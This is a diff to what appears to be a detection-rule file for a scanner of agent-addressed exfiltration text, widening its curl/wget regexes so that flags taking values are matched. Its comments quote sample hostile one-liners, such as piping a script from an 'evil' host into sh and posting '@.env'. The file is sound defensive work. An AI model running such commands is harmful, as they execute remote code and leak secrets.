@@ -116,12 +116,21 @@ rules:
       - "transmit (the )?(contents|data)"
     strong_verbs:
       - "\\bexfiltrate\\b"
-      # Absorb optional space-separated flags/args between the verb and the URL so
-      # the canonical `curl -fsSL https://evil | sh` / `wget -q https://evil` forms
-      # match — the old `\S*` was a single non-space run and could not span the
-      # flag-to-URL space, silently missing every flagged install/exfil one-liner.
-      - "\\bcurl\\b\\s+(?:-\\S+\\s+)*https?://"
-      - "\\bwget\\b\\s+(?:-\\S+\\s+)*https?://"
+      # Absorb any whitespace-separated tokens between the verb and the URL so
+      # the URL is matched regardless of flag shape. The v0.3.0 absorber
+      # `(?:-\S+\s+)*` only consumed bare `-flag ` token runs, so any flag that
+      # takes a value (`-X POST`, `-d @.env`, `-o out`, `--max-time 5`,
+      # `-H "..."`) left the non-dash value token un-absorbed, `https?://` was
+      # tried against that value, and the whole match failed — the strong_verb
+      # never fired, so an agent-addressed curl/wget exfil one-liner exited 0 (a
+      # false-clean on the exit-gating severity). The absorber is now a
+      # non-greedy run of any token `(?:\S+\s+)*?`, terminated by the URL
+      # itself, so the value-vs-URL ambiguity is resolved by "stop at the URL"
+      # and every flag-value form matches. The non-greedy form still matches the
+      # no-flag (`curl https://evil`) and bare-flag (`curl -fsSL https://evil`)
+      # forms (0 or 1 absorbed tokens). (fix-curl-wget-flag-value-false-clean)
+      - "\\bcurl\\b\\s+(?:\\S+\\s+)*?https?://"
+      - "\\bwget\\b\\s+(?:\\S+\\s+)*?https?://"
       - "post (the )?(contents|data|file).{0,30}https?://"
       - "fetch\\s+https?://"
 
